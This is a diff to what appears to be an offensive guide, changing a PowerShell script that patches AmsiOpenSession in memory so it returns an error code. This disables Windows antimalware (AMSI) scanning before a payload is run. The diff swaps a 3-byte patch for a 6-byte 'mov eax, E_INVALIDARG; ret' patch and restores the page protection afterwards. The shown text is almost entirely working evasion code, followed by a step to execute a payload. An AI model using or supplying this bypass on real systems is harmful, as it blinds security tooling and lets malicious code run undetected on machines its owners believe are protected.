@@ -49,10 +49,11 @@ function getDelegateType {
 [IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
 $oldProtectionBuffer = 0
 $vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
-$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
-$buf = [Byte[]] (0x48, 0x31, 0xC0)
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
-$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+$vp.Invoke($funcAddr, 6, 0x40, [ref]$oldProtectionBuffer)
+# mov eax, 0x80070057 (E_INVALIDARG) ; ret  — 6 bytes
+$buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 6)
+$vp.Invoke($funcAddr, 6, $oldProtectionBuffer, [ref]$oldProtectionBuffer)
 ```
 
 3. Execute Payload, e.g, `amisUtils`
